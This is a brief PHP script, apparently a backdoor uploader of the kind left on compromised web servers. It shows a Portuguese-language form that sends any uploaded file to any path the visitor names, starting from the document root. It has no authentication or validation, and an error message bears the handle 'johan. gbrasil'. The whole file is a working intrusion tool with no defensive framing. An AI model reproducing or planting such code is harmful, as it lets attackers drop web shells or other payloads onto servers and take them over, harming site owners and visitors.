<?
$docr = $_SERVER['DOCUMENT_ROOT'];
echo <<<HTML
<center>
<table>
<form enctype="multipart/form-data" method="POST">
<input type="hidden" name="ac" value="upload">
<tr>
<td colspan="2">
<p align="center"><b>Enviar arquivo para o servidor</b></td>
</tr>
<tr>
<td>Arquivo:</td>
<td><input size="48" name="file" type="file"></td>
</tr>
<tr>
<td>Enviar para:</td>
<td><input size="48" value="$docr/" name="path" type="text"><input type="submit" value="Enviar"></td>
</table>
</center>
HTML;

if (isset($_POST['path'])){

$uploadfile = $_POST['path'].$_FILES['file']['name'];
if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}

if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "Voce enviou para: $uploadfile\n";
    echo "o arquivo: " .$_FILES['file']['name']. "\n";
    echo "com o tamanho: " .$_FILES['file']['size']. "\n";

} else {
    print "johan. gbrasil:\n";
    print_r($_FILES);
}
}

?>
